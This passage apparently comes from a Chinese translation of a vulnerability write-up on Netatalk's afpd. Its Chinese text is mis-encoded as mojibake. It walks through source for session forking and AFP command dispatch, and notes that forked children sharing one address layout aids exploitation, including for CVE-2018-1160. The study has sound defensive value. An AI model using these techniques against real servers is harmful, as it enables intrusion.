            <span class="k">if</span> <span class="p">(</span><span class="n">asev</span><span class="o">-&gt;</span><span class="n">fdset</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">POLLIN</span> <span class="o">|</span> <span class="n">POLLERR</span> <span class="o">|</span> <span class="n">POLLHUP</span> <span class="o">|</span> <span class="n">POLLNVAL</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">asev</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fdtype</span><span class="p">)</span> <span class="p">{</span>

                <span class="k">case</span> <span class="n">LISTEN_FD</span><span class="p">:</span>
                    <span class="k">if</span> <span class="p">((</span><span class="n">child</span> <span class="o">=</span> <span class="n">dsi_start</span><span class="p">(</span><span class="o">&amp;</span><span class="n">obj</span><span class="p">,</span> <span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="p">)(</span><span class="n">asev</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="k">private</span><span class="p">),</span> <span class="n">server_children</span><span class="p">)))</span> <span class="p">{</span>
                        <span class="p">...</span>
                    <span class="p">}</span>
                    <span class="k">break</span><span class="p">;</span>
    <span class="p">...</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">dsi_start()</code>å‡½æ•°åŸºæœ¬ä¸Šåªè°ƒç”¨äº†2ä¸ªå‡½æ•°ï¼š<code class="language-plaintext highlighter-rouge">dsi_getsession()</code>ä»¥åŠ<code class="language-plaintext highlighter-rouge">afp_over_dsi()</code>ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/main.c</span>
<span class="k">static</span> <span class="n">afp_child_t</span> <span class="o">*</span><span class="nf">dsi_start</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">,</span> <span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">server_children</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">afp_child_t</span> <span class="o">*</span><span class="n">child</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dsi_getsession</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_children</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">.</span><span class="n">tickleval</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">"dsi_start: session error: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* we've forked. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">configfree</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">dsi</span><span class="p">);</span>
        <span class="n">afp_over_dsi</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span> <span class="cm">/* start a session */</span>
        <span class="n">exit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">child</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>å…¶ä¸­<code class="language-plaintext highlighter-rouge">dsi_getsession()</code>å‡½æ•°è°ƒç”¨äº†<code class="language-plaintext highlighter-rouge">dsi-&gt;proto_open</code>è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘<code class="language-plaintext highlighter-rouge">dsi_tcp_open()</code>å‡½æ•°ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/dsi/dsi_getsess.c</span>
<span class="cm">/*!
 * Start a DSI session, fork an afpd process
 *
 * @param childp    (w) after fork: parent return pointer to child, child returns NULL
 * @returns             0 on sucess, any other value denotes failure
 */</span>
<span class="kt">int</span> <span class="nf">dsi_getsession</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">serv_children</span><span class="p">,</span> <span class="kt">int</span> <span class="n">tickleval</span><span class="p">,</span> <span class="n">afp_child_t</span> <span class="o">**</span><span class="n">childp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_open</span><span class="p">(</span><span class="n">dsi</span><span class="p">))</span> <span class="p">{</span> <span class="cm">/* in libatalk/dsi/dsi_tcp.c */</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">dsi_tcp_open()</code>å‡½æ•°æ¥å—å®¢æˆ·ç«¯è¿æ¥ï¼Œé€šè¿‡<code class="language-plaintext highlighter-rouge">fork()</code>å‡½æ•°åˆ›å»ºå­è¿›ç¨‹ï¼Œå¹¶åˆå§‹åŒ–ä¸å®¢æˆ·ç«¯çš„DSIä¼šè¯ã€‚</p><p>æç¤ºï¼šè¿™å¯¹ä¹‹åçš„åˆ©ç”¨éå¸¸æœ‰ç”¨ã€‚</p><blockquote><p>è¯‘è€…ï¼šCVE-2018-1160 åŒæ ·éœ€è¦åˆ©ç”¨Netatalkçš„è¿™ä¸€ç‰¹æ€§ï¼Œå³å¯¹æ¯ä¸ªå®¢æˆ·ç«¯å‘æ¥çš„è¿æ¥ï¼Œéƒ½æ˜¯ç”¨<code class="language-plaintext highlighter-rouge">fork()</code>å‡½æ•°æ–°å»ºä¸€ä¸ªå­è¿›ç¨‹å•ç‹¬å¤„ç†ä¼šè¯ã€‚è¿™æ˜¯ç”±äºé€šè¿‡<code class="language-plaintext highlighter-rouge">fork()</code>åˆ›å»ºçš„æ¯ä¸ªå­è¿›ç¨‹çš„å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€æ˜¯ç›¸åŒçš„ï¼Œå¯ä»¥é€šè¿‡è¯¥ç‰¹æ€§ï¼Œåˆ©ç”¨ä¿¡æ¯æ³„éœ²æ¼æ´è·å–åœ°å€ã€‚</p></blockquote><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="cm">/* accept the socket and do a little sanity checking */</span>
<span class="k">static</span> <span class="n">pid_t</span> <span class="nf">dsi_tcp_open</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
    <span class="n">SOCKLEN_T</span> <span class="n">len</span><span class="p">;</span>

    <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">client</span><span class="p">);</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">socket</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">serversock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
    <span class="p">...</span>
   <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="p">)</span> <span class="p">{</span> <span class="cm">/* child */</span>
        <span class="p">...</span>
    <span class="p">}</span>

    <span class="cm">/* send back our pid */</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>å›åˆ°<code class="language-plaintext highlighter-rouge">dsi_getsession()</code>å‡½æ•°ï¼Œçˆ¶è¿›ç¨‹<code class="language-plaintext highlighter-rouge">afpd</code>è®¾ç½® <code class="language-plaintext highlighter-rouge">*childp!=NULL</code>ï¼Œè€Œforkå‡ºçš„å¤„ç†å®¢æˆ·ç«¯è¿æ¥çš„å­è¿›ç¨‹è®¾ç½® <code class="language-plaintext highlighter-rouge">*childp==NULL</code>ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/dsi/dsi_getsess.c</span>
<span class="cm">/*!
 * Start a DSI session, fork an afpd process
 *
 * @param childp    (w) after fork: parent return pointer to child, child returns NULL
 * @returns             0 on sucess, any other value denotes failure
 */</span>
<span class="kt">int</span> <span class="nf">dsi_getsession</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">serv_children</span><span class="p">,</span> <span class="kt">int</span> <span class="n">tickleval</span><span class="p">,</span> <span class="n">afp_child_t</span> <span class="o">**</span><span class="n">childp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_open</span><span class="p">(</span><span class="n">dsi</span><span class="p">))</span> <span class="p">{</span> <span class="cm">/* in libatalk/dsi/dsi_tcp.c */</span>
  <span class="k">case</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
    <span class="cm">/* if we fail, just return. it might work later */</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_getsess: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

  <span class="k">case</span> <span class="mi">0</span><span class="p">:</span> <span class="cm">/* child. mostly handled below. */</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="nl">default:</span> <span class="cm">/* parent */</span>
    <span class="cm">/* using SIGKILL is hokey, but the child might not have
     * re-established its signal handler for SIGTERM yet. */</span>
    <span class="n">close</span><span class="p">(</span><span class="n">ipc_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">child</span> <span class="o">=</span> <span class="n">server_child_add</span><span class="p">(</span><span class="n">serv_children</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">ipc_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="o">==</span>  <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_getsess: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
      <span class="n">close</span><span class="p">(</span><span class="n">ipc_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_flags</span> <span class="o">=</span> <span class="n">DSIFL_REPLY</span><span class="p">;</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">DSIERR_SERVBUSY</span><span class="p">);</span>
      <span class="n">dsi_send</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span> <span class="o">=</span> <span class="n">DSIERR_OK</span><span class="p">;</span>
      <span class="n">kill</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="o">*</span><span class="n">childp</span> <span class="o">=</span> <span class="n">child</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="p">...</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
  <span class="k">case</span> <span class="n">DSIFUNC_OPEN</span><span class="p">:</span> <span class="cm">/* setup session */</span>
    <span class="cm">/* set up the tickle timer */</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="n">tickleval</span><span class="p">;</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">dsi_opensession</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="o">*</span><span class="n">childp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="nl">default:</span> <span class="cm">/* just close */</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_info</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"DSIUnknown %d"</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span><span class="p">);</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_CLNT</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>è®©æˆ‘ä»¬å›åˆ°<code class="language-plaintext highlighter-rouge">dsi_start()</code>å‡½æ•°ã€‚å¯¹äºçˆ¶è¿›ç¨‹æ¥è¯´ï¼Œæ²¡æœ‰å‘ç”Ÿä»»ä½•æ–°çš„äº‹æƒ…ï¼Œå¹¶ä¸”<code class="language-plaintext highlighter-rouge">main()</code>å‡½æ•°ç»§ç»­å¹¶æ°¸è¿œå¾ªç¯ä¸‹å»ï¼Œç­‰å¾…å…¶å®ƒå®¢æˆ·ç«¯çš„è¿æ¥ã€‚å¯¹äºå¤„ç†å®¢æˆ·ç«¯è¿æ¥çš„å­è¿›ç¨‹æ¥è¯´ï¼Œ<code class="language-plaintext highlighter-rouge">afp_over_dsi()</code>å‡½æ•°è¢«è°ƒç”¨ã€‚è¯¥å‡½æ•°è¯»å–AFPæ•°æ®åŒ…ï¼ˆDSI payloadï¼‰ï¼Œåˆ¤æ–­AFPå‘½ä»¤æ˜¯ä»€ä¹ˆï¼Œå¹¶æ ¹æ®å‘½ä»¤è°ƒç”¨<code class="language-plaintext highlighter-rouge">afp_switch[]</code>å…¨å±€æ•°ç»„ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆæ¥å¤„ç†AFPå‘½ä»¤ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/afp_dsi.c</span>
<span class="cm">/* -------------------------------------------
 afp over dsi. this never returns.
*/</span>
<span class="kt">void</span> <span class="nf">afp_over_dsi</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="cm">/* get stuck here until the end */</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="cm">/* Blocking read on the network socket */</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="n">dsi_stream_receive</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
        <span class="p">...</span>
        <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="k">case</span> <span class="n">DSIFUNC_CMD</span><span class="p">:</span>
            <span class="p">...</span>
                <span class="cm">/* send off an afp command. in a couple cases, we take advantage
                 * of the fact that we're a stream-based protocol. */</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])</span> <span class="p">{</span>
                    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">datalen</span> <span class="o">=</span> <span class="n">DSI_DATASIZ</span><span class="p">;</span>
                    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">|=</span> <span class="n">DSI_RUNNING</span><span class="p">;</span>

                    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">"&lt;== Start AFP command: %s"</span><span class="p">,</span> <span class="n">AfpNum2name</span><span class="p">(</span><span class="n">function</span><span class="p">));</span>

                    <span class="n">AFP_AFPFUNC_START</span><span class="p">(</span><span class="n">function</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">AfpNum2name</span><span class="p">(</span><span class="n">function</span><span class="p">));</span>
                    <span class="n">err</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])(</span><span class="n">obj</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">datalen</span><span class="p">);</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">afp_switch[]</code>å…¨å±€æ•°ç»„åœ¨ä¸€å¼€å§‹è¢«åˆå§‹åŒ–ä¸º<code class="language-plaintext highlighter-rouge">preauth_switch</code>ï¼Œè¯¥å…¨å±€å˜é‡åŒ…å«äº†ä¸€äº›åœ¨è®¤è¯å‰å¯ä»¥æ‰§è¡Œçš„å‡½æ•°å¥æŸ„ã€‚æˆ‘ä»¬å¯ä»¥çŒœå‡ºï¼Œå½“å®¢æˆ·ç«¯é€šè¿‡éªŒè¯ä¹‹åï¼Œè¯¥å…¨å±€æ•°ç»„å°†è¢«è®¾ç½®ä¸º<code class="language-plaintext highlighter-rouge">postauth_switch</code>è¿™ä¸ªå€¼ï¼Œè¯¥å€¼ä¼šç»™å®¢æˆ·ç«¯æ›´å¤šçš„å…¶å®ƒAFPç‰¹æ€§çš„è®¿é—®æƒé™ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/switch.c</span>
<span class="cm">/*
 * Routines marked "NULL" are not AFP functions.
 * Routines marked "afp_null" are AFP functions
 * which are not yet implemented. A fine line...
 */</span>
<span class="k">static</span> <span class="n">AFPCmd</span> <span class="n">preauth_switch</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*   0 -   7 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*   8 -  15 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_login</span><span class="p">,</span> <span class="n">afp_logincont</span><span class="p">,</span>
    <span class="n">afp_logout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>				<span class="cm">/*  16 -  23 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  24 -  31 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  32 -  39 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  40 -  47 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  48 -  55 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_login_ext</span><span class="p">,</span>				<span class="cm">/*  56 -  63 */</span>
    <span class="p">...</span>
<span class="p">};</span>

<span class="n">AFPCmd</span> <span class="o">*</span><span class="n">afp_switch</span> <span class="o">=</span> <span class="n">preauth_switch</span><span class="p">;</span>

<span class="n">AFPCmd</span> <span class="n">postauth_switch</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_bytelock</span><span class="p">,</span> <span class="n">afp_closevol</span><span class="p">,</span> <span class="n">afp_closedir</span><span class="p">,</span>
    <span class="n">afp_closefork</span><span class="p">,</span> <span class="n">afp_copyfile</span><span class="p">,</span> <span class="n">afp_createdir</span><span class="p">,</span> <span class="n">afp_createfile</span><span class="p">,</span>	<span class="cm">/*   0 -   7 */</span>
    <span class="n">afp_delete</span><span class="p">,</span> <span class="n">afp_enumerate</span><span class="p">,</span> <span class="n">afp_flush</span><span class="p">,</span> <span class="n">afp_flushfork</span><span class="p">,</span>
    <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_getforkparams</span><span class="p">,</span> <span class="n">afp_getsrvrinfo</span><span class="p">,</span>	<span class="cm">/*   8 -  15 */</span>
    <span class="n">afp_getsrvrparms</span><span class="p">,</span> <span class="n">afp_getvolparams</span><span class="p">,</span> <span class="n">afp_login</span><span class="p">,</span> <span class="n">afp_logincont</span><span class="p">,</span>
    <span class="n">afp_logout</span><span class="p">,</span> <span class="n">afp_mapid</span><span class="p">,</span> <span class="n">afp_mapname</span><span class="p">,</span> <span class="n">afp_moveandrename</span><span class="p">,</span>	<span class="cm">/*  16 -  23 */</span>
    <span class="n">afp_openvol</span><span class="p">,</span> <span class="n">afp_opendir</span><span class="p">,</span> <span class="n">afp_openfork</span><span class="p">,</span> <span class="n">afp_read</span><span class="p">,</span>
    <span class="n">afp_rename</span><span class="p">,</span> <span class="n">afp_setdirparams</span><span class="p">,</span> <span class="n">afp_setfilparams</span><span class="p">,</span> <span class="n">afp_setforkparams</span><span class="p">,</span>
    <span class="cm">/*  24 -  31 */</span>
    <span class="n">afp_setvolparams</span><span class="p">,</span> <span class="n">afp_write</span><span class="p">,</span> <span class="n">afp_getfildirparams</span><span class="p">,</span> <span class="n">afp_setfildirparams</span><span class="p">,</span>
    <span class="n">afp_changepw</span><span class="p">,</span> <span class="n">afp_getuserinfo</span><span class="p">,</span> <span class="n">afp_getsrvrmesg</span><span class="p">,</span> <span class="n">afp_createid</span><span class="p">,</span> <span class="cm">/*  32 -  39 */</span>
    <span class="n">afp_deleteid</span><span class="p">,</span> <span class="n">afp_resolveid</span><span class="p">,</span> <span class="n">afp_exchangefiles</span><span class="p">,</span> <span class="n">afp_catsearch</span><span class="p">,</span>
    <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span>			<span class="cm">/*  40 -  47 */</span>
    <span class="n">afp_opendt</span><span class="p">,</span> <span class="n">afp_closedt</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_geticon</span><span class="p">,</span>
    <span class="n">afp_geticoninfo</span><span class="p">,</span> <span class="n">afp_addappl</span><span class="p">,</span> <span class="n">afp_rmvappl</span><span class="p">,</span> <span class="n">afp_getappl</span><span class="p">,</span>	<span class="cm">/*  48 -  55 */</span>
    <span class="n">afp_addcomment</span><span class="p">,</span> <span class="n">afp_rmvcomment</span><span class="p">,</span> <span class="n">afp_getcomment</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="p">...</span>
<span class="p">};</span>
